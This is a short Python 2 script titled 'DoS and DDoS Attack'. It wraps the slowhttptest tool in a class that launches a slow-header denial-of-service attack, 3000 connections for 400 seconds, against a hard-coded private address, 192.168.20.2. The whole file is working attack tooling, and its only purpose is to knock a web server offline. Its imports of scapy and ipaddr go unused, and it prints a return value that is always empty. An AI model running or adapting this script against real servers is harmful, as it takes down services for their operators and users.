# Jayesh Patel 
# DoS and DDoS Attack 

from scapy.all import *
import ipaddr
import commands

class Dos_Tools(object):
	def __init__(self, dip):
		self.dip = dip

	def slowhttp_ATT(self, op, sec):
		cmd = "slowhttptest -c 3000 -%s -g -o my_header_stats -i 90 -r 200 -t GET -u http://192.168.20.2 -x 24 -p 3 -l %s" % (op, sec)
		status, output = commands.getstatusoutput(cmd)
		print output



if __name__ == "__main__":
	res = Dos_Tools('192.168.20.2')
	data = res.slowhttp_ATT('H', 400)
	print data
